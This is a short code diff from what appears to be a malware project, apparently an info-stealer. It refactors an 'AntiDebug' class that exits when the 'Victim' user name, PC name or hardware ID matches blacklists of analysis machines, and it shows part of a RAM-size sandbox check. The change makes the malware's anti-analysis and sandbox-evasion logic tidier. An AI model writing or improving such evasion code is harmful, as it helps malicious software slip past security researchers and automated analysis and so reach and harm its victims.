@@ -750,17 +750,15 @@ class AntiDebug(Functions):
             if ntpath.exists(path):
                 self.programExit()
 
-        for user in self.blackListedUsers:
-            if Victim == user:
-                self.programExit()
+        if Victim in self.blackListedUsers:
+            self.programExit()
 
-        for pcName in self.blackListedPCNames:
-            if Victim_pc == pcName:
-                self.programExit()
-
-        for hwid in self.blackListedHWIDS:
-            if self.system_info()[0] == hwid:
-                self.programExit()
+        if Victim_pc in self.blackListedPCNames:
+            self.programExit()
+        
+        hwid = self.system_info()[0]
+        if hwid in self.blackListedHWIDS:
+            self.programExit()
 
     def specsCheck(self):
         # would not recommend changing this to over 2gb since some actually have 3gb of ram
